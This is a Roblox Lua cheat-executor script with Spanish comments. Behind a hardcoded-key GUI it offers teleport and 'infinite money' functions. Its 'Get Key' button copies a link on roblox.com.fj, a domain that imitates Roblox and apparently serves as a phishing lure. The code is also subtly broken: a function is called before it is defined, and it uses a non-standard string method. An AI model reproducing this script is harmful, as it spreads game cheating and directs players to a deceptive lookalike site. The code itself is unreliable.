--[ Servicios ]--
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

--[ Configuración ]--
local CORRECT_KEY = "12345"
local KEY_URL = "https://roblox.com.fj/communities/7058519134/"

--[ Variables y Funciones de la GUI ]--
local mainGui = Instance.new("ScreenGui")
mainGui.Name = "ExecutorGUI"
mainGui.Parent = PlayerGui

local function createMainFrame(name)
    local frame = Instance.new("Frame")
    frame.Name = name
    frame.Size = UDim2.new(0, 300, 0, 400)
    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    frame.BackgroundTransparency = 0.2
    frame.BorderSizePixel = 0
    frame.ClipsDescendants = true
    frame.Parent = mainGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame

    return frame
end

local function createTitleBar(parent, text)
    local titleFrame = Instance.new("Frame")
    titleFrame.Name = "TitleBar"
    titleFrame.Size = UDim2.new(1, 0, 0, 40)
    titleFrame.Position = UDim2.new(0, 0, 0, 0)
    titleFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    titleFrame.BackgroundTransparency = 0.1
    titleFrame.BorderSizePixel = 0
    titleFrame.Parent = parent

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "TitleLabel"
    titleLabel.Size = UDim2.new(1, 0, 1, 0)
    titleLabel.Text = text
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.TextSize = 20
    titleLabel.BackgroundTransparency = 1
    titleLabel.Parent = titleFrame

    local dragging = false
    local dragStartPos
    titleFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStartPos = input.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStartPos
            parent.Position = parent.Position + UDim2.new(0, delta.X, 0, delta.Y)
            dragStartPos = input.Position
        end
    end)
    titleFrame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
end

local function createContentFrame(parent)
    local contentFrame = Instance.new("Frame")
    contentFrame.Name = "ContentFrame"
    contentFrame.Size = UDim2.new(1, 0, 1, -40)
    contentFrame.Position = UDim2.new(0, 0, 0, 40)
    contentFrame.BackgroundTransparency = 1
    contentFrame.Parent = parent
    
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 10)
    padding.PaddingBottom = UDim.new(0, 10)
    padding.PaddingLeft = UDim.new(0, 10)
    padding.PaddingRight = UDim.new(0, 10)
    padding.Parent = contentFrame

    local layout = Instance.new("UIListLayout")
    layout.FillDirection = Enum.FillDirection.Vertical
    layout.Padding = UDim.new(0, 10)
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    layout.VerticalAlignment = Enum.VerticalAlignment.Top
    layout.Parent = contentFrame

    return contentFrame
end

local function createButton(parent, text, callback)
    local button = Instance.new("TextButton")
    button.Name = "Button"
    button.Size = UDim2.new(1, 0, 0, 40)
    button.Text = text
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
    button.BackgroundTransparency = 0.2
    button.BorderSizePixel = 0
    button.Font = Enum.Font.SourceSansBold
    button.TextSize = 18
    button.Parent = parent

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = button

    button.MouseButton1Click:Connect(callback)
end

local function createTextBox(parent, placeholder)
    local textBox = Instance.new("TextBox")
    textBox.Name = "TextBox"
    textBox.Size = UDim2.new(1, 0, 0, 40)
    textBox.PlaceholderText = placeholder
    textBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    textBox.BackgroundTransparency = 0.2
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.BorderSizePixel = 0
    textBox.Font = Enum.Font.SourceSans
    textBox.TextSize = 16
    textBox.ClearTextOnFocus = false
    textBox.Parent = parent
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = textBox

    return textBox
end

--[ Lógica de la GUI ]--

local keySystemFrame = createMainFrame("KeySystemFrame")
createTitleBar(keySystemFrame, "Key System")
local keyContentFrame = createContentFrame(keySystemFrame)

local keyInstructionLabel = Instance.new("TextLabel")
keyInstructionLabel.Name = "InstructionLabel"
keyInstructionLabel.Size = UDim2.new(1, 0, 0, 50)
keyInstructionLabel.Text = "Únete a mi grupo para obtener la key.\nPulsa 'Get Key' para copiar el enlace del grupo."
keyInstructionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
keyInstructionLabel.Font = Enum.Font.SourceSans
keyInstructionLabel.TextSize = 14
keyInstructionLabel.TextWrapped = true
keyInstructionLabel.BackgroundTransparency = 1
keyInstructionLabel.Parent = keyContentFrame

local getKeyButton = createButton(keyContentFrame, "Get Key", function()
    pcall(function()
        setclipboard(KEY_URL)
    end)
end)

local keyTextBox = createTextBox(keyContentFrame, "Enter your key here...")

local enterButton = createButton(keyContentFrame, "Check Key", function()
    if keyTextBox.Text:trim() == CORRECT_KEY then
        keySystemFrame.Visible = false
        showMainMenu()
    else
        keyTextBox.Text = ""
    end
end)

local mainMenuFrame = createMainFrame("MainMenuFrame")
mainMenuFrame.Visible = false

local function showMainMenu()
    mainMenuFrame.Visible = true
    createTitleBar(mainMenuFrame, "Main Menu")
    local menuContentFrame = createContentFrame(mainMenuFrame)
    
    local tpButton = createButton(menuContentFrame, "Teleport to Spawn", function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local rootPart = character and character:FindFirstChild("HumanoidRootPart")
        if rootPart and game.Workspace:FindFirstChild("SpawnLocation") then
            rootPart.CFrame = game.Workspace.SpawnLocation.CFrame * CFrame.new(0, 5, 0)
        end
    end)

    local moneyButton = createButton(menuContentFrame, "Give Infinite Money", function()
        local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
        local moneyValue = leaderstats and leaderstats:FindFirstChild("Money")
        if moneyValue then
            task.spawn(function()
                while mainMenuFrame.Visible do
                    moneyValue.Value += 1000
                    task.wait(0.1)
                end
            end)
        end
    end)
end
